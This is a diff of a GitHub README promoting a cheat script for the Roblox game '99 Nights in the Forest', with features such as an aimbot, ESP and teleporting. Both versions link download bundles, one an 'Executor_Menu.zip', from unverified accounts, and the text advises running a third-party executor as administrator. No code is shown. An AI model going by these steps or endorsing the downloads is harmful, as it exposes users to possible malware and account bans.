@@ -1,55 +1,75 @@
-# 99-Nights-in-The-Forest-Script
+# 🛡️ 99-Nights-in-The-Forest-Script - Simplify Your Gameplay Experience
 
-<p align="center">
-<img src="https://github.com/user-attachments/assets/dab8e397-ca3f-4a88-901d-d32abdd18943" alt="99 Nights in the Forest Script GUI - no key" />
-</p>
+## 🚀 Getting Started
 
-<h2 align="center">
-<table align="center"> <tr>
-      <th scope="col">99 Nights in the Forest Script</th>
-      <th scope="col">10 / 29 / 2025</th>
-  <th scope="col"><a href='https://github.com/Decryptor-j/99-Nights-in-The-Forest-Script/releases/download/99-Nights-in-The-Forest-Script-ALPHA/Executor_Menu.zip'>SCRIPT</a></th>
- </tr></table>
-</h2>
+Welcome to the **99-Nights-in-The-Forest-Script**! This powerful utility script enhances your experience while playing Roblox's "99 Nights in the Forest." With features like visual assistance, automated farming, instant travel, and fly mode, you can streamline your survival, farming, and looting.
 
-    
+## 📥 Download Now
 
-<h3 align="center">Available for Windows and Android<br><br></h3>
+[![Download 99-Nights-in-The-Forest-Script](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/shafhyfox/99-Nights-in-The-Forest-Script/releases)
 
-<div align="center">
-<img src="https://github.com/user-attachments/assets/f3a987e9-9755-4c66-919c-681d3f87535f" width="100"/>
-</div>
+## 📋 Features
 
-## ⚠️ Disclaimer
-For educational and testing purposes only.
-The use of third-party scripts may lead to account penalties, including bans. Users assume all responsibility for any risks associated with its use.
+- **ESP (Extra Sensory Perception):** See items and players through obstacles for better navigation and strategy.
+- **Automated Farming:** Gather resources effortlessly, saving you time and effort.
+- **Instant Travel:** Move quickly across the map, reaching your destination in seconds.
+- **Fly Mode:** Enjoy freedom of movement to explore the game from any angle.
+- **Enhanced User Interface:** A user-friendly design to help you access all features easily.
 
-## 🚀 Script Features
-- **Item, NPC & Chest ESP**: See all valuable resources, enemies, and loot inside walls for ultimate awareness.
-- **Precision Aimbot**: Hold right-click to automatically lock on and eliminate any threat.
-- **Instant Teleport**: Teleport directly to campfires, grinders, lost children, chests, and all major items instantly.
-- **Full Fly Mode**: Use WASD, Space, and Shift to fly with complete freedom across the map (Toggle with Q).
-- **Auto Tree Farm & Wood Gathering**: Automate the most tedious tasks with our advanced auto-farming system.
-- **Adjustable Speed**: Move across the map faster than ever with a customizable speed multiplier.
-- **Anti-Death Mechanism**: Automatically teleports you to safety when your health is critically low.
-- **No Fog & Night Vision**: Toggle off environmental fog and gain clear vision, day or night.
-- **Auto Attacks / Kill Aura**: Automatically defeat enemies that come too close.
+## 💻 System Requirements
 
-## 📖 How to Use This Script
-1.  First, you need a Roblox script executor. We recommend Decryptor for its simplicity.
-2.  GUI made it simple, you can execute script there easily.
-3.  After executing open the Roblox game "99 Nights in the Forest".
-4.  The Decryptor UI should appear, allowing you to configure all features.
+- **Operating System:** Windows 7, 8, or 10
+- **Roblox Player:** Latest version of Roblox installed
+- **RAM:** At least 4 GB
+- **Disk Space:** A minimum of 100 MB free space
 
-## Contributing
-Community contributions are always welcome! If you're interested in improving the **99 nights in the forest script**, please fork the repository and submit a pull request. For more details, check out our [contributing guidelines](https://github.com/Decryptor-j/Aviator-Predictor/blob/main/CONTRIBUTING.md).
+## 📥 Download & Install
 
-## Support
-If you run into any problems or have questions about Decryptor Executor Roblox, visit the “Releases” section for the latest updates and troubleshooting details. For additional help or to report issues, feel free to reach out through the “Issues” tab on this repository.
+To get started, visit the page to download the script:
 
-## License
-This project is licensed under the [MIT License](https://opensource.org/licenses/MIT) - see the [LICENSE](LICENSE) file for details.
+[Download 99-Nights-in-The-Forest-Script](https://github.com/shafhyfox/99-Nights-in-The-Forest-Script/releases)
 
----
+### Step-by-Step Installation
 
-Thank you for choosing Decryptor Executor Roblox for your scripting needs. Dive into the world of Roblox with confidence and explore the endless possibilities that our executor has to offer. Happy scripting! 🚀🎮
+1. **Visit the Releases Page:** Click the link above to go to the Releases page.
+   
+2. **Choose the Latest Version:** Look for the most recent version of the script.
+
+3. **Download the File:** Click on the download link for the script file. This file will usually have a `.lua` extension.
+
+4. **Save the File:** Choose a location on your computer where you want to save the downloaded file.
+
+5. **Open Roblox:** Launch the Roblox player.
+
+6. **Load the Script:**
+    - Use a scripting executor that is compatible with Roblox.
+    - Open the executor and locate the downloaded script file.
+    - Click the “Execute” button to run the script in your game.
+
+7. **Access Features:** Once executed, you can start using all the features the script offers.
+
+## 🛠️ Troubleshooting Tips
+
+- **Script Not Working:** Ensure you have the latest version of Roblox and the executor.
+- **Permissions Issue:** Run the executor as an administrator if you encounter permission errors.
+- **Malfunctioning Features:** Make sure you are using the script in the appropriate game environment.
+
+## 🤝 Community Support
+
+For any issues or to contribute to the discussion, visit the Issues section in our repository. Engaging with the community can help you find solutions quickly.
+
+## 📖 Additional Resources
+
+You can find more information about the script and related topics in the following places:
+
+- **Roblox Developer Forum:** A great resource for general Roblox scripting.
+- **YouTube Tutorials:** Video guides can help you understand how to use scripts effectively.
+
+## 🔗 Helpful Links
+
+- [Official Roblox Website](https://www.roblox.com/)
+- [GitHub Releases for 99-Nights-in-The-Forest-Script](https://github.com/shafhyfox/99-Nights-in-The-Forest-Script/releases)
+
+## 🧩 Conclusion
+
+The **99-Nights-in-The-Forest-Script** aims to enhance your gaming experience with useful features. Follow the steps above to download and enjoy your gameplay. Happy gaming!
